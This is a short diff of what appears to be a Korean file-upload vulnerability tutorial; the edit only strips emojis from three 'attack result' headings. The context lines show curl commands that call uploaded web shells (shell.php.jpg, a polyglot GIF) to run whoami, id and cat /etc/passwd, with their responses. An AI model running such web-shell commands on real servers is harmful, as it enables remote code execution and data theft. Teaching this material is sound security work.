@@ -125,7 +125,7 @@ curl "http://target/uploads/shell.php.jpg?cmd=whoami"
 # 응답: www-data
 ```
 
-**[공격 결과]**: 확장자 필터 우회 → RCE 🔓
+**[공격 결과]**: 확장자 필터 우회 → RCE
 
 ---
 
@@ -151,7 +151,7 @@ curl "http://target/uploads/polyglot.php.gif?cmd=id"
 # 응답: uid=33(www-data) gid=33(www-data)
 ```
 
-**[공격 결과]**: Magic Bytes 검증 우회 → RCE 🔓
+**[공격 결과]**: Magic Bytes 검증 우회 → RCE
 
 ---
 
@@ -179,7 +179,7 @@ curl -F "file=@shell.jpg" http://target/upload
 curl "http://target/uploads/shell.jpg?cmd=cat%20/etc/passwd"
 ```
 
-**[공격 결과]**: 서버 설정 조작 → 임의 파일 실행 🔓
+**[공격 결과]**: 서버 설정 조작 → 임의 파일 실행
 
 ---
 
